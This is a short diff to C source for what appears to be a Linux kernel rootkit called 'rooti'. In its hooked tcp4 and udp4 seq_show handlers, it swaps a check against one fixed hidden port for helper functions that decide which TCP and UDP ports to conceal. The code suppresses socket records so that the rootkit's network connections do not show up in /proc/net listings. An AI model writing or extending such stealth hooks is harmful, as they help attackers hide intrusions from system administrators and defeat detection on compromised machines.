@@ -191,7 +191,7 @@ static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
     struct sock *socket = v;
 
     // Check that this is not the header line and that the record is the one we want to hide
-    if (socket != SEQ_START_TOKEN && socket->sk_num == ROOTI_HIDE_PORT) {
+    if (socket != SEQ_START_TOKEN && rooti_should_hide_tcp_port(socket->sk_num)) {
         return 0;
     }
     // Not the port to hide - call the original handler
@@ -203,7 +203,7 @@ static int hook_udp4_seq_show(struct seq_file *seq, void *v)
     struct sock *socket = v;
 
     // Check that this is not the header line and that the record is the one we want to hide
-    if (socket != SEQ_START_TOKEN && socket->sk_num == ROOTI_HIDE_PORT) {
+    if (socket != SEQ_START_TOKEN && rooti_should_hide_udp_port(socket->sk_num)) {
         return 0;
     }
 
